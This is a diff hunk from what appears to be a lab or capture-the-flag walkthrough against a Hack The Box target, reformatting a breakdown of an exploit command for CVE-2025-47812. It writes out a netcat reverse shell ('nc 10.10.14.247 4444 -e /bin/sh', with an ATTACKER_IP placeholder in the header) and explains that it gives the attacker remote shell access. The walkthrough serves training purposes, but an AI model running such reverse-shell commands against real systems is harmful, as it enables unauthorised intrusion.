@@ -579,11 +579,17 @@ Command: `python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "nc ATTACKER_I
 
 Breakdown:
 
-- `nc 10.10.14.247 4444` Description: Netcat Client | Purpose: Directs the target to connect to the attacker's listener at the specified IP and port.
-    
-- `-e /bin/sh` Description: Execute Flag | Purpose: Binds the system shell to the network socket, providing remote command-line access.
-    
-- `-v` Description: Verbose Mode | Purpose: Provides real-time feedback on the injection and extraction process.
+- `nc 10.10.14.247 4444`
+	- Description: Netcat Client
+	- Purpose: Directs the target to connect to the attacker's listener at the specified IP and port.
+
+- `-e /bin/sh`
+	- Description: Execute Flag
+	- Purpose: Binds the system shell to the network socket, providing remote command-line access.
+
+- `-v` Description:
+	- Verbose Mode
+	- Purpose: Provides real-time feedback on the injection and extraction process.
 
 Output:
 
